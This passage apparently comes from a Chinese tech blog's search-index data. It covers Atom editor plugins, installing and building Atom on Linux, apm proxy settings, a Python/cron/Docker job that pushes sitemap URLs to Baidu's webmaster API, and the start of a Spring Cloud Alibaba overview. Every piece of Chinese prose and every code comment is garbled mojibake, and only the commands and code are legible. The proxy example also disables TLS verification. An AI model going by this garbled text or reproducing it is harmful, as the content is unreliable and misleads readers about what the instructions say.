åˆ°æŒ‡å®šçš„å›¾åºŠï¼Œéœ€è¦é¢å¤–å®‰è£…é’ˆå¯¹å›¾åºŠçš„ä¸Šä¼ æ’ä»¶$ apm install markdown-assistant# é˜¿é‡Œäº‘å›¾åºŠä¸Šä¼ æ’ä»¶ï¼Œæ”¯æŒ markdown-assistant$ apm install oss-uploader# å¾®åšå›¾åºŠä¸Šä¼ æ’ä»¶ï¼Œæ”¯æŒ markdown-assistant$ apm installweibo-uploader# é’äº‘å›¾åºŠä¸Šä¼ æ’ä»¶ï¼Œæ”¯æŒ markdown-assistant$ apm install qcloud-uploader# ä¸ƒç‰›å›¾åºŠï¼ˆå¯¹è±¡å­˜å‚¨ï¼‰ä¸Šä¼ æ’ä»¶ï¼Œæ”¯æŒ markdown-assistant$ apm install qiniu-uploader Atom çš„ Git æ’ä»¶ 1234567891011121314# å›¾å½¢åŒ–Gitæäº¤è®°å½•$ apm install git-log# é€šè¿‡Ctrl+Shift+Pæ‰§è¡ŒGitå‘½ä»¤$ apm install git-plus# é€‚ç”¨äºGitçš„å›¾å½¢åŒ–æ“ä½œé¢æ¿$ apm install git-control# é€‚ç”¨äºGitçš„åˆå¹¶å·¥å…·$ apm install merge-conflicts#æ˜¾ç¤ºæ–‡ä»¶å¤¹çš„GitçŠ¶æ€$ apm install tree-view-git-status Atom å…¶ä»–å¸¸ç”¨æ’ä»¶ 1234567891011121314# å›¾æ ‡ç¾åŒ–$ apm install file-icons# é€‚ç”¨äºAtomçš„é…ç½®å¤‡ä»½ä¸åŒæ­¥$ apm install sync-settings# åœ¨å½“å‰ç›®å½•æ‰“å¼€ç³»ç»ŸåŸç”Ÿçš„ç»ˆç«¯æ§åˆ¶å°$ apm install open-terminal-here# ç»ˆç«¯æ§åˆ¶å°ï¼ˆæ–¹æ¡ˆä¸€ï¼‰ï¼Œæ¨èä½¿ç”¨$ apm install termination# ç»ˆç«¯æ§åˆ¶å°ï¼ˆæ–¹æ¡ˆäºŒï¼‰$ apm install platformio-ide-terminal markdown-image-paste æ’ä»¶çš„é…ç½®ç¤ºä¾‹ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¼€å‘å·¥å…·"},{title:"Linux å®‰è£… Atom ç¼–è¾‘å™¨",url:"/posts/90c5573a.html",text:'æœ€æ–°å…¬å‘Š æˆªæ­¢ 2021 å¹´ 10 æœˆ 22 æ—¥ï¼Œç”±äº Atom å®˜æ–¹å¼€å‘ç»„è°ƒæ•´äº†å…¼å®¹ç­–ç•¥ï¼ŒAtom 1.58.0 + ä¸å†æ”¯æŒè¿è¡Œåœ¨ CentOS7ï¼ˆæˆ– RedHat 7ï¼‰ï¼Œå³ Atom æ— æ³•é€šè¿‡ YUM åœ¨çº¿å®‰è£…æˆ–è€… RPM åŒ…ç¦»çº¿å®‰è£…ã€‚è‹¥å¸Œæœ›åœ¨ CentOS7 ä¸Šç»§ç»­ä½¿ç”¨ Atomï¼Œè¯·ç¡®ä¿ Atom çš„ç‰ˆæœ¬å°äºç­‰äº 1.57ï¼Œè¯¦æƒ…è¯·çœ‹è¿™é‡Œã€‚ ç›¸å…³ç«™ç‚¹ Atom Github Atom å®˜æ–¹å®‰è£…æ•™ç¨‹ï¼ˆLinux ç‰ˆï¼‰ Atom å®˜æ–¹æºç å®‰è£…æ•™ç¨‹ï¼ˆLinux ç‰ˆï¼‰ Debianã€Ubuntu å®‰è£… Atom æ–¹æ³•ä¸€ï¼šé€šè¿‡ Atom å®˜æ–¹çš„è½¯ä»¶åŒ…å­˜å‚¨åº“æ¥å®‰è£…ï¼Œä¼˜ç‚¹æ˜¯èƒ½å¤Ÿåœ¨å®˜æ–¹å‘å¸ƒæ–°ç‰ˆæœ¬æ—¶ï¼Œå¾ˆæ–¹ä¾¿åœ°æ›´æ–° Atom 1234567891011# æ·»åŠ Key# wget -qO - https://packagecloud.io/AtomEditor/atom/gpgkey | apt-key add -# æ·»åŠ è½¯ä»¶åŒ…å­˜å‚¨åº“# sh -c \'echo "deb [arch=amd64] https://packagecloud.io/AtomEditor/atom/any/ any main" &gt; /etc/apt/sources.list.d/atom.list\'# æ›´æ–°è½¯ä»¶æºåˆ—è¡¨# apt-get update# å®‰è£…Atom# apt-get install atom æ–¹æ³•äºŒï¼šä¸‹è½½ Atom çš„ DEB è½¯ä»¶åŒ…å¹¶ç›´æ¥å®‰è£… 12345# å®‰è£…Atom# dpkg -i atom-amd64.deb# è‹¥å®‰è£…è¿‡ç¨‹æç¤ºç¼ºå¤±ä¾èµ–ï¼Œå¯æ‰§è¡Œä¸‹è¿°å‘½ä»¤è§£å†³# apt-get -f install CentOS å®‰è£… Atom æ–¹æ³•ä¸€ï¼šé€šè¿‡ Atom å®˜æ–¹çš„è½¯ä»¶åŒ…å­˜å‚¨åº“æ¥å®‰è£…ï¼Œä¼˜ç‚¹æ˜¯èƒ½å¤Ÿåœ¨å®˜æ–¹å‘å¸ƒæ–°ç‰ˆæœ¬æ—¶ï¼Œå¾ˆæ–¹ä¾¿åœ°æ›´æ–° Atom 12345678# æ·»åŠ Key# rpm --import https://packagecloud.io/AtomEditor/atom/gpgkey# æ·»åŠ è½¯ä»¶åŒ…å­˜å‚¨åº“# sh -c \'echo -e "[Atom]\\nname=Atom Editor\\nbaseurl=https://packagecloud.io/AtomEditor/atom/el/7/\\$basearch\\nenabled=1\\ngpgcheck=0\\nrepo_gpgcheck=1\\ngpgkey=https://packagecloud.io/AtomEditor/atom/gpgkey" &gt; /etc/yum.repos.d/atom.repo\'# å®‰è£…Atom# yum install atom æ–¹æ³•äºŒï¼šä¸‹è½½ Atom çš„ RPM è½¯ä»¶åŒ…å¹¶ç›´æ¥å®‰è£… 12# å®‰è£…Atom# yum install -y atom.x86_64.rpm æºç å®‰è£… Atom è‹¥é¡¹ç›®æ—¥å¸¸å¼€å‘ä¸­é‡åˆ° Atom çš„ Bugï¼Œæˆ–è€…æ˜¯æƒ³å°è¯•å‘ Atom çš„ç³»ç»Ÿæ ¸å¿ƒæ·»åŠ åŠŸèƒ½ï¼Œåˆ™éœ€è¦åœ¨ Dev æ¨¡å¼ä¸‹è¿è¡Œ Atomï¼Œå¹¶è®¿é—®æœ¬åœ°çš„ Atom æºç ã€‚ å…‹éš† Atom çš„æºç ï¼Œå¹¶ä»¥å¼€å‘è€…æ¨¡å¼å¯åŠ¨ï¼š 12345678910111213141516171819# å…‹éš†Atomçš„æºç # å»ºè®®ä¸‹è½½Github Releasesé¡µé¢ä¸Šå‘å¸ƒçš„æºç å‹ç¼©åŒ…ï¼Œè€Œä¸æ˜¯ç›´æ¥å…‹éš†Atomçš„masteråˆ†æ”¯ä»£ç $ git clone git@github.com:your-username/atom.git# è¿›å…¥Atomçš„æºç ç›®å½•$ cd atom# å®‰è£…Atomçš„ä¾èµ–ï¼Œå¦‚æœå®‰è£…è¿‡ç¨‹å‡ºç°â€œkeyboard-layoutâ€åŒ…æ„å»ºå¤±è´¥çš„é”™è¯¯ï¼Œæ­¤æ—¶éœ€è¦é¢å¤–å®‰è£…"libxkbfile-devel"è½¯ä»¶åŒ…$ ./script/bootstrap# ä½¿ç”¨å¼€å‘æ¨¡å¼å¯åŠ¨Atom$ atom --dev# æˆ–è€…æŒ‡å®šAtomçš„æºç è·¯å¾„ï¼Œä¹Ÿå¯ä»¥é€šè¿‡è®¾ç½®ç¯å¢ƒå˜é‡"ATOM_DEV_RESOURCE_PATH"æ¥æŒ‡å®šæºç æ‰€åœ¨çš„è·¯å¾„$ atom --dev atom-source-path# æç¤ºï¼š# å»ºè®®é€šè¿‡è®¾ç½®ç¯å¢ƒå˜é‡"ATOM_DEV_RESOURCE_PATH"ï¼ŒæŒ‡å®šAtomæºç æ‰€åœ¨çš„è·¯å¾„# å¦‚æœ atom å‘½ä»¤åœ¨ç»ˆç«¯ä¸­æ²¡æœ‰å“åº”ï¼Œè¯·å°è¯• atom-dev æˆ– atom-betaï¼Œåç¼€å–å†³äºæ‰€å…‹éš†çš„ç‰¹å®šæºä»£ç çš„ç‰ˆæœ¬ æœ¬åœ°æµ‹è¯•è¿è¡Œ Atomï¼š 12345# è¿›å…¥Atomçš„æºç ç›®å½•$ cd atom# æµ‹è¯•$ atom --test spec æ„å»ºç”Ÿæˆ Atom çš„å®‰è£…åŒ… Ubuntuã€Debian æ„å»ºç”Ÿæˆ DEB å®‰è£…åŒ…ï¼š 123456789101112131415# å®‰è£…ä¾èµ–# apt-get install build-essential git libsecret-1-dev fakeroot rpm libx11-dev libxkbfile-dev# å¦‚æœä¸‹é¢æ‰§è¡Œ script/build è„šæœ¬å‡ºç°é”™è¯¯ï¼Œåˆ™å¯èƒ½éœ€è¦ä½¿ç”¨C++11å®‰è£…æ›´æ–°çš„C++ç¼–è¯‘å™¨# add-apt-repository ppa:ubuntu-toolchain-r/test# apt-get update# apt-get install gcc-5 g++-5# update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-5 80 --slave /usr/bin/g++ g++ /usr/bin/g++-5# update-alternatives --config gcc # or choose gcc-5 from the list# è¿›å…¥Atomçš„æºç ç›®å½•$ cd atom# æ„å»ºå®‰è£…åŒ…$ ./script/build --create-debian-package CentOS æ„å»ºç”Ÿæˆ RPM å®‰è£…åŒ…ï¼š 12345678# å®‰è£…ä¾èµ–# yum install -y make gcc gcc-c++ glibc-devel git-core libsecret-devel rpmdevtools libxkbfile-devel# è¿›å…¥Atomçš„æºç ç›®å½•$ cd atom# æ„å»ºå®‰è£…åŒ…$ ./script/build --create-rpm-package Atom è®¾ç½®ä»£ç† 123456789101112# æ–¹æ³•ä¸€# è®¾ç½®ä»£ç†$ apm config set strict-ssl false$ apm config set proxy YOUR_PROXY_ADDRESS$ apm config set http-proxy YOUR_PROXY_ADDRESS$ apm config set https-proxy YOUR_PROXY_ADDRESS# éªŒè¯ä»£ç†é…ç½®æ˜¯å¦æ­£ç¡®$ apm config get proxy$ apm config get http-proxy$ apm config get https-proxy 12345678910111213# æ–¹æ³•äºŒ# ç¼–è¾‘Atomçš„é…ç½®æ–‡ä»¶ï¼Œæ·»åŠ ä»£ç†é…ç½®$ vim ~/.atom/.apmrcstrict-ssl=falseproxy=http://127.0.0.1:8118http-proxy=http://127.0.0.1:8118https-proxy=http://127.0.0.1:8118# éªŒè¯ä»£ç†é…ç½®æ˜¯å¦æ­£ç¡®$ apm config get proxy$ apm config get http-proxy$ apm config get https-proxy Atom çš„é…ç½®æ–‡ä»¶ Atom é»˜è®¤çš„é…ç½®æ–‡ä»¶å­˜æ”¾åœ¨ ~/.atom ç›®å½•ä¸‹ï¼Œå…¶ä¸­çš„ ~/.atom/packages ç”¨äºå­˜æ”¾ Atom çš„æ’ä»¶ï¼Œ~/.atom ç›®å½•å¯ä»¥ç§»æ¤åˆ°ä¸åŒçš„å¹³å°ï¼ˆLinuxã€Windowã€Macï¼‰ã€‚åœ¨å¼€å‘è€…æ¨¡å¼ä¸‹ï¼ŒAtom é»˜è®¤åŠ è½½çš„æ’ä»¶ç›®å½•ä¸ºï¼š~/.atom/dev/packagesã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux å¼€å‘å·¥å…·"},{title:"ç™¾åº¦ç«™é•¿é“¾æ¥æäº¤ - ä¸»åŠ¨æ¨é€ï¼ˆPython ç‰ˆï¼‰",url:"/posts/920b584b.html",text:'å‰è¨€åœ¨åŠ é€Ÿç™¾åº¦æœç´¢å¼•æ“æ”¶å½•ç«™ç‚¹æ–¹é¢ï¼Œç™¾åº¦ç«™é•¿ç›®å‰æä¾›è‡ªåŠ¨æäº¤é“¾æ¥å’Œæ‰‹åŠ¨æäº¤é“¾æ¥ä¸¤ç§æ–¹å¼ï¼Œå…¶ä¸­è‡ªåŠ¨æäº¤åˆåˆ†ä¸ºä¸»åŠ¨æ¨é€ã€è‡ªåŠ¨æ¨é€å’Œ sitemap ä¸‰ç§å½¢å¼ã€‚æŒ‰ç™¾åº¦çš„è¯´æ³•ï¼Œä¸»åŠ¨æ¨é€çš„æ•ˆæœæœ€å¥½ï¼Œç™¾åº¦ç«™é•¿å¹³å°åå°æä¾›äº† Curlã€PHPã€Ruby çš„æ¨é€ç¤ºä¾‹ä»£ç ï¼Œä½†å”¯ç‹¬æ²¡æœ‰æä¾› Python ç¤ºä¾‹ä»£ç ã€‚æœ¬æ–‡ä¼šç»™å‡ºç°æˆçš„ Python ç‰ˆæœ¬ä¸»åŠ¨æ¨é€ä»£ç ï¼Œç³»ç»Ÿç¯å¢ƒä¾èµ– Linuxï¼Œè½¯ä»¶ç¯å¢ƒä¾èµ– Python3ã€Curlã€‚ Python3 ä»£ç ä»¥ä¸‹ä»£ç ä¼šè¯»å–ç‰¹å®šåŸŸåä¸‹çš„ sitemap ç«™ç‚¹åœ°å›¾æ–‡ä»¶ï¼Œç„¶åé€šè¿‡ Curl å‘½ä»¤å°†ç«™ç‚¹åœ°å›¾æ–‡ä»¶ä¸­åˆæ³• ï¼ˆç»“å°¾ä¸º .htmlï¼‰çš„ URL æ‰¹é‡æäº¤ç»™ç™¾åº¦ç«™é•¿å¹³å°ï¼Œè¯·è‡ªè¡Œæ›¿æ¢ä»£ç ä¸­çš„ domainã€tokenã€site_map_url å˜é‡å€¼ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677# -*- coding: utf-8 -*-import reimport loggingimport subprocessfrom io import StringIOfrom urllib import request# ç«™ç‚¹åŸŸådomain = \'www.example.com\'# åœ¨ç™¾åº¦ç«™é•¿ç”³è¯·çš„æ¨é€ç”¨çš„å‡†å…¥å¯†é’¥token = \'xxxxxxxxxxxxxxxxx\'# ç«™ç‚¹åœ°å›¾çš„URLsite_map_url = \'https://www.example.com/sitemap.xml\'# æœ€å¤§çš„é“¾æ¥æ¨é€æ•°é‡push_max_lines = 1000# æ¨é€çš„URLé“¾æ¥æ–‡ä»¶push_urls_file = "/tmp/baidu_zhanzhang_push_url.txt"# æ•°æ®æ¨é€çš„æ¥å£push_url = \'http://data.zz.baidu.com/urls?site={domain}&amp;token={token}\'.format(domain=domain, token=token)# æ—¥å¿—æ–‡ä»¶log_file = "/tmp/baidu/baidu_zhanzhang_push.log"def regexpMatchUrl(content): pattern = re.findall(r\'(http|https):\\/\\/[\\w\\-_]+(\\.[\\w\\-_]+)+([\\w\\-\\.,@?^=%&amp;amp;:/~\\+#]*[\\w\\-\\@?^=%&amp;amp;/~\\+#])?\', content, re.IGNORECASE) if pattern: return True else: return Falsedef regexpMatchWebSite(content): pattern = re.findall(r\'\'.join(domain), content, re.IGNORECASE) if pattern: return True else: return Falsedef getUrl(content): pattern = re.findall(r\'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&amp;+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+.html\', content, re.IGNORECASE) if pattern: return pattern[0] else: return \'\'def createUrlFile(url_file_path, max_lines): content = request.urlopen(site_map_url).read().decode(\'utf8\') website_map_file = StringIO(content) url_file = open(url_file_path, \'w\') index = 0 for line in website_map_file: if(regexpMatchUrl(line) and regexpMatchWebSite(line)): url = getUrl(line) if(url != \'\'): index = index + 1 url_file.writelines(url + "\\n") if(index &gt;= max_lines): break url_file.close() website_map_file.close()def pushUrlFile(url, url_file_path, log_file): shell_cmd_line = "curl -H \'Content-Type:text/plain\' --data-binary @" + url_file_path + " " + \'\\"\' + url + \'\\"\' (status, output) = subprocess.getstatusoutput(shell_cmd_line) logging.info(output + "\\n") # print(shell_cmd_line)if __name__ == "__main__": logging.basicConfig(level=logging.INFO, format=\'%(asctime)s - %(name)s - %(levelname)s - %(message)s\', filename=log_file) createUrlFile(push_urls_file, push_max_lines) pushUrlFile(push_url, push_urls_file, log_file) Crontab å®šæ—¶ä»»åŠ¡Linux ç³»ç»Ÿç¯å¢ƒä¸‹ï¼Œé…åˆ Python è„šæœ¬ + Crontab å®šæ—¶ä»»åŠ¡ï¼Œå³å¯å®šæ—¶ä¸»åŠ¨æäº¤é“¾æ¥åˆ°ç™¾åº¦ç«™é•¿å¹³å°ã€‚ 12# æ¯éš”ä¸¤å°æ—¶ä¸»åŠ¨æäº¤ä¸€æ¬¡é“¾æ¥0 */2 * * * /usr/bin/python3 /usr/local/baidu-push/baidu_zhanzhang_push.py è„šæœ¬è¾“å‡ºçš„æ—¥å¿—ä¿¡æ¯123456789$ cat /tmp/baidu/baidu_zhanzhang_push.log2019-02-18 23:15:20,985 - www - INFO - % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0100 6092 100 30 100 6062 82 16671 --:--:-- --:--:-- --:--:-- 16653{"remain":98069,"success":138} Docker ä¸€é”®éƒ¨ç½²æ¨é€æœåŠ¡ Dockerfile çš„å†…å®¹å¦‚ä¸‹ï¼Œæ„å»ºç”Ÿæˆ Docker é•œåƒåï¼Œä½¿ç”¨å‘½ä»¤ç›´æ¥å¯åŠ¨ Docker é•œåƒå³å¯ã€‚ ä½¿ç”¨å‘½ä»¤ç›´æ¥å¯åŠ¨ Docker é•œåƒæ—¶ï¼Œéœ€è¦é€šè¿‡ -v å‚æ•°å°†å®¿ä¸»æœºçš„ Python è„šæœ¬æ–‡ä»¶æŒ‚è½½åˆ° Docker å®¹å™¨å†…çš„ /usr/local/python_scripts/baidu_zhanzhang_push.py ä½ç½®ã€‚ 123456789101112131415161718192021222324252627282930313233343536from augurproject/python2-and-3MAINTAINER clay&lt;656418510@qq.com&gt;RUN mkdir -p /tmp/baiduRUN touch /var/log/cron.logRUN mkdir -p /usr/local/python_scriptsENV workpath /usr/local/python_scriptsWORKDIR $workpathRUN echo "Asia/Shanghai" &gt; /etc/timezoneRUN ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtimeRUN cp /etc/apt/sources.list /etc/apt/backup.sources.listRUN echo "deb http://mirrors.163.com/debian/ stretch main non-free contrib" &gt; /etc/apt/sources.listRUN echo "deb http://mirrors.163.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb http://mirrors.163.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb-src http://mirrors.163.com/debian/ stretch main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb-src http://mirrors.163.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb-src http://mirrors.163.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb http://mirrors.163.com/debian-security/ stretch/updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb-src http://mirrors.163.com/debian-security/ stretch/updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN apt-get -y update &amp;&amp; apt-get -y upgradeRUN apt-get -y install python-rsa python-requests cron rsyslog vim htop net-tools telnet apt-utils tree wget curl git make gccRUN apt-get -y autoclean &amp;&amp; apt-get -y autoremoveRUN sed -i "s/#cron./cron./g" /etc/rsyslog.confRUN echo "0 */2 * * * root /usr/bin/python3 /usr/local/python_scripts/baidu_zhanzhang_push.py" &gt;&gt; /etc/crontabCMD service rsyslog start &amp;&amp; service cron start &amp;&amp; tail -f -n 20 /var/log/cron.log è‹¥é€šè¿‡ Docker-Compose æ¥ç®¡ç† Docker é•œåƒï¼Œé‚£ä¹ˆ YML é…ç½®æ–‡ä»¶çš„å†…å®¹å¦‚ä¸‹ï¼š 123456789101112version: \'3.5\'services: baidu-push: image: clay/baidu-push:1.0 container_name: hexo-baidu-push restart: always environment: TZ: \'Asia/Shanghai\' volumes: - /usr/local/baidu-push/logs:/tmp/baidu - /usr/local/baidu-push/baidu_zhanzhang_push.py:/usr/local/python_scripts/baidu_zhanzhang_push.py æ•°æ®å·æŒ‚è½½ï¼š /usr/local/baidu-push/logsï¼šå®¿ä¸»æœºé‡Œçš„æ—¥å¿—ç›®å½• /usr/local/baidu-push/baidu_zhanzhang_push.pyï¼šå®¿ä¸»æœºé‡Œ Python è„šæœ¬æ–‡ä»¶çš„è·¯å¾„ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"python"},{title:"Spring Cloud Alibaba æ–°ä¸€ä»£å¾®æœåŠ¡è§£å†³æ–¹æ¡ˆ",url:"/posts/97d0a561.html",text:'Spring Cloud Alibaba æ˜¯ä»€ä¹ˆSpring Cloud Alibaba æ˜¯é˜¿é‡Œå·´å·´æä¾›çš„å¾®æœåŠ¡å¼€å‘ä¸€ç«™å¼è§£å†³æ–¹æ¡ˆï¼Œæ˜¯é˜¿é‡Œå·´å·´å¼€æºä¸­é—´ä»¶ä¸ Spring Cloud ä½“ç³»çš„èåˆï¼ŒGithub é¡¹ç›®åœ°å€åœ¨è¿™é‡Œï¼Œå®˜æ–¹æ–‡æ¡£åœ¨è¿™é‡Œã€‚ Spring Cloud æ¦‚è¿°æèµ·å¾®æœåŠ¡ï¼Œä¸å¾—ä¸æ Spring Cloud å…¨å®¶æ¡¶ç³»åˆ—ï¼ŒSpring Cloud æ˜¯è‹¥å¹²ä¸ªæ¡†æ¶çš„é›†åˆï¼ŒåŒ…æ‹¬ spring-cloud-configã€spring-cloud-bus ç­‰è¿‘ 20 å¤šä¸ªå­é¡¹ç›®ï¼Œæä¾›äº†æœåŠ¡æ²»ç†ã€æœåŠ¡ç½‘å…³ã€æ™ºèƒ½è·¯ç”±ã€è´Ÿè½½å‡è¡¡ã€æ–­è·¯å™¨ã€ç›‘æ§è·Ÿè¸ªã€åˆ†å¸ƒå¼æ¶ˆæ¯é˜Ÿåˆ—ã€é…ç½®ç®¡ç†ç­‰é¢†åŸŸçš„è§£å†³æ–¹æ¡ˆã€‚Spring Cloud é€šè¿‡ Spring Boot é£æ ¼çš„å°è£…ï¼Œå±è”½æ‰äº†å¤æ‚çš„é…ç½®å’Œå®ç°åŸç†ï¼Œæœ€ç»ˆç»™å¼€å‘è€…ç•™å‡ºäº†ä¸€å¥—ç®€å•æ˜“æ‡‚ã€å®¹æ˜“éƒ¨ç½²çš„åˆ†å¸ƒå¼ç³»ç»Ÿå¼€å‘å·¥å…·åŒ…ã€‚ä¸€èˆ¬æ¥è¯´ï¼ŒSpring Cloud åŒ…å«ä»¥ä¸‹ç»„ä»¶ï¼Œä¸»è¦ä»¥ Netflix å¼€æºé¡¹ç›®ä¸ºä¸»ï¼š Spring Cloud Alibaba æ¦‚è¿°åŒ Spring Cloud ä¸€æ ·ï¼ŒSpring Cloud Alibaba ä¹Ÿæ˜¯ä¸€å¥—å¾®æœåŠ¡è§£å†³æ–¹æ¡ˆï¼ŒåŒ…å«å¼€å‘åˆ†å¸ƒå¼åº”ç”¨å¾®æœåŠ¡çš„å¿…éœ€ç»„ä»¶ï¼Œæ–¹ä¾¿å¼€å‘è€…é€šè¿‡ Spring Cloud ç¼–ç¨‹æ¨¡å‹è½»æ¾ä½¿ç”¨è¿™äº›ç»„ä»¶æ¥å¼€å‘åˆ†å¸ƒå¼åº”ç”¨æœåŠ¡ã€‚ä¾æ‰˜ Spring Cloud Alibabaï¼Œå¼€å‘è€…åªéœ€è¦æ·»åŠ ä¸€äº›æ³¨è§£å’Œå°‘é‡é…ç½®ï¼Œå°±å¯ä»¥å°† Spring Cloud åº”ç”¨æ¥å…¥é˜¿é‡Œå¾®æœåŠ¡è§£å†³æ–¹æ¡ˆï¼Œé€šè¿‡é˜¿é‡Œä¸­é—´ä»¶æ¥è¿…é€Ÿæ­å»ºåˆ†å¸ƒå¼åº”ç”¨ç³»ç»Ÿã€‚ä½œä¸º Spring Cloud ä½“ç³»ä¸‹çš„æ–°å®ç°ï¼ŒSpring Cloud Alibaba è·Ÿå®˜æ–¹çš„ç»„ä»¶æˆ–å…¶å®ƒçš„ç¬¬ä¸‰æ–¹å®ç°å¦‚ Netflixã€Consulã€Zookeeper ç­‰å¯¹æ¯”ï¼Œå…·å¤‡äº†æ›´å¤šçš„åŠŸèƒ½: Spring Cloud Alibaba åŒ…å«çš„ç»„ä»¶ä¸‹å›¾æ˜¯ Spring Cloud Alibaba ç³»åˆ—ç»„ä»¶ï¼Œå…¶ä¸­åŒ…å«äº†é˜¿é‡Œå¼€æºç»„ä»¶ã€é˜¿é‡Œäº‘å•†ä¸šåŒ–ç»„ä»¶ï¼Œä»¥åŠé›†æˆäº† Spring Cloud ç»„ä»¶ã€‚ Alibaba å¼€æºç»„ä»¶ Nacosï¼šä¸€ä¸ªæ›´æ˜“äºæ„å»ºäº‘åŸç”Ÿåº”ç”¨çš„åŠ¨æ€æœåŠ¡å‘ç°ã€é…ç½®ç®¡ç†å’ŒæœåŠ¡ç®¡ç†å¹³å°ã€‚ Sentinelï¼šæŠŠæµé‡ä½œä¸ºåˆ‡å…¥ç‚¹ï¼Œä»æµé‡æ§åˆ¶ã€ç†”æ–­é™çº§ã€ç³»ç»Ÿè´Ÿè½½ä¿æŠ¤ç­‰å¤šä¸ªç»´åº¦ä¿æŠ¤æœåŠ¡çš„ç¨³å®šæ€§ã€‚ RocketMQï¼šå¼€æºçš„åˆ†å¸ƒå¼æ¶ˆæ¯ç³»ç»Ÿï¼ŒåŸºäºé«˜å¯ç”¨åˆ†å¸ƒå¼é›†ç¾¤æŠ€æœ¯ï¼Œæä¾›ä½å»¶æ—¶çš„ã€é«˜å¯é çš„æ¶ˆæ¯å‘å¸ƒä¸è®¢é˜…æœåŠ¡ã€‚ Dubboï¼šåœ¨å›½å†…åº”ç”¨éå¸¸å¹¿æ³›çš„ä¸€æ¬¾é«˜æ€§èƒ½ Java RPC æ¡†æ¶ã€‚ Seataï¼šé˜¿é‡Œå·´å·´å¼€æºäº§å“ï¼Œä¸€ä¸ªæ˜“äºä½¿ç”¨çš„é«˜æ€§èƒ½å¾®æœåŠ¡åˆ†å¸ƒå¼äº‹åŠ¡è§£å†³æ–¹æ¡ˆã€‚ Arthasï¼šå¼€æºçš„ Java åŠ¨æ€è¿½è¸ªå·¥å…·ï¼ŒåŸºäºå­—èŠ‚ç å¢å¼ºæŠ€æœ¯ï¼ŒåŠŸèƒ½éå¸¸å¼ºå¤§ã€‚ Alibaba å•†ä¸šåŒ–ç»„ä»¶ Alibaba Cloud ACMï¼šä¸€æ¬¾åœ¨åˆ†å¸ƒå¼æ¶æ„ç¯å¢ƒä¸­å¯¹åº”ç”¨é…ç½®è¿›è¡Œé›†ä¸­ç®¡ç†å’Œæ¨é€çš„åº”ç”¨é…ç½®ä¸­å¿ƒäº§å“ã€‚ Alibaba Cloud OSSï¼šé˜¿é‡Œäº‘å¯¹è±¡å­˜å‚¨æœåŠ¡ï¼ˆObject Storage Serviceï¼Œç®€ç§° OSSï¼‰ï¼Œæ˜¯é˜¿é‡Œäº‘æä¾›çš„äº‘å­˜å‚¨æœåŠ¡ã€‚ Alibaba Cloud SchedulerXï¼šé˜¿é‡Œä¸­é—´ä»¶å›¢é˜Ÿå¼€å‘çš„ä¸€æ¬¾åˆ†å¸ƒå¼ä»»åŠ¡è°ƒåº¦äº§å“ï¼Œæä¾›ç§’çº§ã€ç²¾å‡†çš„å®šæ—¶ï¼ˆåŸºäº Cron è¡¨è¾¾å¼ï¼‰ä»»åŠ¡è°ƒåº¦æœåŠ¡ã€‚ Alibaba é›†æˆ Spring Cloud ç»„ä»¶Spring Cloud Alibaba ä½œä¸ºæ•´å¥—çš„å¾®æœåŠ¡è§£å†³ç»„ä»¶ï¼Œåªä¾é ç›®å‰é˜¿é‡Œçš„å¼€æºç»„ä»¶æ˜¯ä¸å¤Ÿçš„ï¼Œæ›´å¤šçš„æ˜¯é›†æˆå½“å‰çš„ç¤¾åŒºç»„ä»¶ï¼Œæ‰€ä»¥ Spring Cloud Alibaba å¯ä»¥é›†æˆ Zuulï¼ŒOpenFeign 